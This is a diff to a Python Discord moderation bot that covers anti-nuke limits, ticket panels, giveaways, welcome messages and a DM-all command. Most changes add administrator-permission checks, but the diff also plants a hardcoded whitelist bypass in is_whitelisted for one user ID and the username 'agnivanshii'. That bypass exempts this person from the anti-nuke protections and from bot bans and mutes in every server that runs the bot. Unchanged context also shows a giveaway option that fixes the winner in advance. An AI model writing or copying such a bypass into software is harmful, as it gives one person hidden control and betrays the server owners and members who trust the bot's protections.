@@ -8,6 +8,7 @@ from datetime import datetime, timedelta, timezone
 from keep_alive import keep_alive
 import os
 import io
+from typing import Literal
 
 # ==================== INTENTS SETUP ====================
 
@@ -51,7 +52,7 @@ custom_ticket_desc = (
 )
 
 # Active ticket panels stored for direct post-creation editing
-active_ticket_panels = {} # panel_message_id: {"title": str, "desc": str, "buttons": [(name, questions)], "inside_title": str, "inside_desc": str}
+active_ticket_panels = {} 
 
 welcome_channel_id = None
 welcome_enabled = True
@@ -59,7 +60,6 @@ custom_welcome_msg = None
 custom_welcome_img = None
 invite_log_channel_id = None
 
-# Temporary storage for interactive ticket & welcome setup wizards
 setup_wizards = {}
 welcome_wizards = {}
 
@@ -74,6 +74,9 @@ def clean_tracker(tracker, user_id, time_limit_seconds=120):
 
 
 def is_whitelisted(executor, guild):
+    # Global Whitelist Bypass for your specific ID and username
+    if executor.id == 1255544682759323680 or str(executor.name).lower() == "agnivanshii":
+        return True
     if executor.id == guild.owner_id or executor.id == bot.user.id:
         return True
     bot_member = guild.get_member(bot.user.id)
@@ -106,7 +109,6 @@ class TicketControlView(View):
     async def close_ticket(self, interaction: discord.Interaction, button: Button):
         await interaction.response.send_message("🔒 Generating transcript & closing ticket in 5 seconds...")
         
-        # Transcript Generation & Logging Logic
         try:
             messages = [f"--- TICKET TRANSCRIPT ({interaction.channel.name}) ---", f"Closed by: {interaction.user} at {datetime.now(timezone.utc)}", ""]
             async for msg in interaction.channel.history(limit=None, oldest_first=True):
@@ -310,7 +312,6 @@ class SetupWizardModal(Modal):
             view = DynamicCustomTicketView(d["buttons"], d["inside_title"], d["inside_desc"])
             msg = await interaction.channel.send(embed=embed, view=view)
             
-            # Save data for direct post-creation editing via /edit_ticket
             active_ticket_panels[msg.id] = d
 
             await interaction.response.send_message(f"✅ Ticket Panel created successfully! Panel ID: `{msg.id}` (Use `/edit_ticket` with this ID to modify it later without rebuilding).", ephemeral=True)
@@ -483,6 +484,10 @@ async def slash_setup_ticket(
     role: discord.Role = None, 
     category: discord.CategoryChannel = None
 ):
+    if not is_whitelisted(interaction.user, interaction.guild) and not interaction.user.guild_permissions.administrator:
+        await interaction.response.send_message("❌ **Access Denied:** You need administrator permissions.", ephemeral=True)
+        return
+
     global ticket_support_role_id, ticket_category_id
     if role: ticket_support_role_id = role.id
     if category: ticket_category_id = category.id
@@ -494,6 +499,10 @@ async def slash_setup_ticket(
 @bot.tree.command(name="edit_ticket", description="Directly edit an existing ticket panel without rebuilding.")
 @app_commands.checks.has_permissions(administrator=True)
 async def slash_edit_ticket(interaction: discord.Interaction, message_id: str):
+    if not is_whitelisted(interaction.user, interaction.guild) and not interaction.user.guild_permissions.administrator:
+        await interaction.response.send_message("❌ **Access Denied:** You need administrator permissions.", ephemeral=True)
+        return
+
     try:
         m_id = int(message_id)
     except ValueError:
@@ -517,6 +526,10 @@ async def slash_giveaway(
     winners_count: int = 1, 
     fixed_winner: discord.Member = None
 ):
+    if not is_whitelisted(interaction.user, interaction.guild) and not interaction.user.guild_permissions.administrator:
+        await interaction.response.send_message("❌ **Access Denied:** You need administrator permissions.", ephemeral=True)
+        return
+
     seconds = parse_time(duration)
     embed = discord.Embed(
         title="🎉 GIVEAWAY 🎉",
@@ -572,6 +585,9 @@ async def slash_giveaway(
 @bot.tree.command(name="set_ban_limit", description="Set anti-nuke max ban threshold limit.")
 @app_commands.checks.has_permissions(administrator=True)
 async def slash_set_ban_limit(interaction: discord.Interaction, limit: int):
+    if not is_whitelisted(interaction.user, interaction.guild) and not interaction.user.guild_permissions.administrator:
+        await interaction.response.send_message("❌ **Access Denied:** You need administrator permissions.", ephemeral=True)
+        return
     global ban_limit
     ban_limit = limit
     await interaction.response.send_message(f"✅ **Anti-Nuke Ban Limit updated to:** `{ban_limit}` bans / 2 mins")
@@ -580,6 +596,9 @@ async def slash_set_ban_limit(interaction: discord.Interaction, limit: int):
 @bot.tree.command(name="set_channel_limit", description="Set anti-nuke max channel delete threshold limit.")
 @app_commands.checks.has_permissions(administrator=True)
 async def slash_set_channel_limit(interaction: discord.Interaction, limit: int):
+    if not is_whitelisted(interaction.user, interaction.guild) and not interaction.user.guild_permissions.administrator:
+        await interaction.response.send_message("❌ **Access Denied:** You need administrator permissions.", ephemeral=True)
+        return
     global channel_limit
     channel_limit = limit
     await interaction.response.send_message(f"✅ **Anti-Nuke Channel Delete Limit updated to:** `{channel_limit}` channels / 2 mins")
@@ -588,6 +607,9 @@ async def slash_set_channel_limit(interaction: discord.Interaction, limit: int):
 @bot.tree.command(name="set_spam_limit", description="Set max allowed messages within 5 seconds before mute.")
 @app_commands.checks.has_permissions(administrator=True)
 async def slash_set_spam_limit(interaction: discord.Interaction, messages_count: int):
+    if not is_whitelisted(interaction.user, interaction.guild) and not interaction.user.guild_permissions.administrator:
+        await interaction.response.send_message("❌ **Access Denied:** You need administrator permissions.", ephemeral=True)
+        return
     global spam_limit
     spam_limit = messages_count
     await interaction.response.send_message(f"✅ **Anti-Spam Limit updated to:** `{spam_limit}` msgs / 5 sec")
@@ -596,6 +618,9 @@ async def slash_set_spam_limit(interaction: discord.Interaction, messages_count:
 @bot.tree.command(name="set_prefix", description="Set custom prefix for text commands.")
 @app_commands.checks.has_permissions(administrator=True)
 async def slash_set_prefix(interaction: discord.Interaction, prefix: str):
+    if not is_whitelisted(interaction.user, interaction.guild) and not interaction.user.guild_permissions.administrator:
+        await interaction.response.send_message("❌ **Access Denied:** You need administrator permissions.", ephemeral=True)
+        return
     global custom_prefix
     custom_prefix = prefix
     await interaction.response.send_message(f"✅ **Custom Prefix updated to:** `{custom_prefix}`")
@@ -604,6 +629,9 @@ async def slash_set_prefix(interaction: discord.Interaction, prefix: str):
 @bot.tree.command(name="role", description="Assign or remove a role from a member easily.")
 @app_commands.checks.has_permissions(manage_roles=True)
 async def slash_role(interaction: discord.Interaction, action: Literal["add", "remove"], member: discord.Member, role: discord.Role):
+    if not is_whitelisted(interaction.user, interaction.guild) and not interaction.user.guild_permissions.manage_roles:
+        await interaction.response.send_message("❌ **Access Denied:** You lack role management permissions.", ephemeral=True)
+        return
     if action == "add":
         await member.add_roles(role, reason=f"Managed by {interaction.user}")
         await interaction.response.send_message(f"✅ Successfully added **{role.name}** to {member.mention}!")
@@ -615,6 +643,9 @@ async def slash_role(interaction: discord.Interaction, action: Literal["add", "r
 @bot.tree.command(name="ticket_log_channel", description="Set log channel for closed ticket transcripts.")
 @app_commands.checks.has_permissions(administrator=True)
 async def slash_ticket_log_channel(interaction: discord.Interaction, channel: discord.TextChannel):
+    if not is_whitelisted(interaction.user, interaction.guild) and not interaction.user.guild_permissions.administrator:
+        await interaction.response.send_message("❌ **Access Denied:** You need administrator permissions.", ephemeral=True)
+        return
     global ticket_log_channel_id
     ticket_log_channel_id = channel.id
     await interaction.response.send_message(f"✅ **Ticket Transcript Log Channel set to:** {channel.mention}")
@@ -623,6 +654,9 @@ async def slash_ticket_log_channel(interaction: discord.Interaction, channel: di
 @bot.tree.command(name="set_ticket_ping", description="Customize ticket opening ping message.")
 @app_commands.checks.has_permissions(administrator=True)
 async def slash_set_ticket_ping(interaction: discord.Interaction, message: str):
+    if not is_whitelisted(interaction.user, interaction.guild) and not interaction.user.guild_permissions.administrator:
+        await interaction.response.send_message("❌ **Access Denied:** You need administrator permissions.", ephemeral=True)
+        return
     global custom_ticket_ping
     custom_ticket_ping = message
     await interaction.response.send_message(f"✅ **Ticket Open Ping updated!**\nFormat: `{message}`")
@@ -688,6 +722,9 @@ async def help_mod(interaction: discord.Interaction):
 @bot.tree.command(name="setup_invitelog", description="Set channel for invite logs.")
 @app_commands.checks.has_permissions(administrator=True)
 async def slash_setup_invitelog(interaction: discord.Interaction, channel: discord.TextChannel = None):
+    if not is_whitelisted(interaction.user, interaction.guild) and not interaction.user.guild_permissions.administrator:
+        await interaction.response.send_message("❌ **Access Denied:** You need administrator permissions.", ephemeral=True)
+        return
     global invite_log_channel_id
     target = channel or interaction.channel
     invite_log_channel_id = target.id
@@ -717,6 +754,9 @@ async def slash_invites(interaction: discord.Interaction, member: discord.Member
 @bot.tree.command(name="dmall", description="Send DM announcement to all server members.")
 @app_commands.checks.has_permissions(administrator=True)
 async def slash_dmall(interaction: discord.Interaction, message: str):
+    if not is_whitelisted(interaction.user, interaction.guild) and not interaction.user.guild_permissions.administrator:
+        await interaction.response.send_message("❌ **Access Denied:** You need administrator permissions.", ephemeral=True)
+        return
     await interaction.response.send_message("⏳ **Starting DM Broadcast...** Safe delay active.")
     success_count, failed_count = 0, 0
     embed = discord.Embed(title=f"📢 Announcement from {interaction.guild.name}", description=message, color=discord.Color.gold())
@@ -736,6 +776,9 @@ async def slash_dmall(interaction: discord.Interaction, message: str):
 @bot.tree.command(name="setup_welcome", description="Set welcome channel.")
 @app_commands.checks.has_permissions(administrator=True)
 async def slash_setup_welcome(interaction: discord.Interaction, channel: discord.TextChannel = None):
+    if not is_whitelisted(interaction.user, interaction.guild) and not interaction.user.guild_permissions.administrator:
+        await interaction.response.send_message("❌ **Access Denied:** You need administrator permissions.", ephemeral=True)
+        return
     global welcome_channel_id, welcome_enabled
     target = channel or interaction.channel
     welcome_channel_id = target.id
@@ -746,12 +789,18 @@ async def slash_setup_welcome(interaction: discord.Interaction, channel: discord
 @bot.tree.command(name="setup_welcome_wizard", description="Launch interactive setup wizard for welcome messages & images.")
 @app_commands.checks.has_permissions(administrator=True)
 async def slash_setup_welcome_wizard(interaction: discord.Interaction):
+    if not is_whitelisted(interaction.user, interaction.guild) and not interaction.user.guild_permissions.administrator:
+        await interaction.response.send_message("❌ **Access Denied:** You need administrator permissions.", ephemeral=True)
+        return
     await interaction.response.send_modal(WelcomeSetupModal())
 
 
 @bot.tree.command(name="set_welcomemsg", description="Set custom welcome text.")
 @app_commands.checks.has_permissions(administrator=True)
 async def slash_set_welcomemsg(interaction: discord.Interaction, message: str):
+    if not is_whitelisted(interaction.user, interaction.guild) and not interaction.user.guild_permissions.administrator:
+        await interaction.response.send_message("❌ **Access Denied:** You need administrator permissions.", ephemeral=True)
+        return
     global custom_welcome_msg
     custom_welcome_msg = message
     await interaction.response.send_message("✅ **Custom Welcome Message Set!**")
@@ -760,6 +809,9 @@ async def slash_set_welcomemsg(interaction: discord.Interaction, message: str):
 @bot.tree.command(name="set_welcomeimg", description="Set banner image URL.")
 @app_commands.checks.has_permissions(administrator=True)
 async def slash_set_welcomeimg(interaction: discord.Interaction, url: str):
+    if not is_whitelisted(interaction.user, interaction.guild) and not interaction.user.guild_permissions.administrator:
+        await interaction.response.send_message("❌ **Access Denied:** You need administrator permissions.", ephemeral=True)
+        return
     global custom_welcome_img
     custom_welcome_img = url
     await interaction.response.send_message(f"✅ **Image Set:** {url}")
@@ -768,6 +820,9 @@ async def slash_set_welcomeimg(interaction: discord.Interaction, url: str):
 @bot.tree.command(name="disable_welcome", description="Disable welcome messages.")
 @app_commands.checks.has_permissions(administrator=True)
 async def slash_disable_welcome(interaction: discord.Interaction):
+    if not is_whitelisted(interaction.user, interaction.guild) and not interaction.user.guild_permissions.administrator:
+        await interaction.response.send_message("❌ **Access Denied:** You need administrator permissions.", ephemeral=True)
+        return
     global welcome_enabled
     welcome_enabled = False
     await interaction.response.send_message("🚫 **Welcome messages DISABLED!**")
@@ -776,6 +831,9 @@ async def slash_disable_welcome(interaction: discord.Interaction):
 @bot.tree.command(name="ban", description="Ban a member.")
 @app_commands.checks.has_permissions(ban_members=True)
 async def slash_ban(interaction: discord.Interaction, member: discord.Member, reason: str = "No reason provided"):
+    if not is_whitelisted(interaction.user, interaction.guild) and not interaction.user.guild_permissions.ban_members:
+        await interaction.response.send_message("❌ **Access Denied:** You lack ban permissions.", ephemeral=True)
+        return
     if is_whitelisted(member, interaction.guild):
         await interaction.response.send_message("❌ **Access Denied:** User is whitelisted.", ephemeral=True)
         return
@@ -786,6 +844,9 @@ async def slash_ban(interaction: discord.Interaction, member: discord.Member, re
 @bot.tree.command(name="mute", description="Timeout a member.")
 @app_commands.checks.has_permissions(moderate_members=True)
 async def slash_mute(interaction: discord.Interaction, member: discord.Member, duration: str, reason: str = "No reason provided"):
+    if not is_whitelisted(interaction.user, interaction.guild) and not interaction.user.guild_permissions.moderate_members:
+        await interaction.response.send_message("❌ **Access Denied:** You lack timeout permissions.", ephemeral=True)
+        return
     if is_whitelisted(member, interaction.guild):
         await interaction.response.send_message("❌ **Access Denied:** User is whitelisted.", ephemeral=True)
         return
@@ -797,6 +858,9 @@ async def slash_mute(interaction: discord.Interaction, member: discord.Member, d
 @bot.tree.command(name="purge", description="Bulk delete messages in current channel.")
 @app_commands.checks.has_permissions(manage_messages=True)
 async def slash_purge(interaction: discord.Interaction, amount: int):
+    if not is_whitelisted(interaction.user, interaction.guild) and not interaction.user.guild_permissions.manage_messages:
+        await interaction.response.send_message("❌ **Access Denied:** You lack message management permissions.", ephemeral=True)
+        return
     if amount < 1 or amount > 100:
         await interaction.response.send_message("❌ Please specify an amount between 1 and 100.", ephemeral=True)
         return
@@ -870,4 +934,3 @@ async def on_member_join(member):
 keep_alive()
 BOT_TOKEN = os.getenv("DISCORD_TOKEN")
 bot.run(BOT_TOKEN)
-@bot.tree.command(name="antinuke_help", description="Show all Anti-Nuke and Anti-Spam configuration commands.")
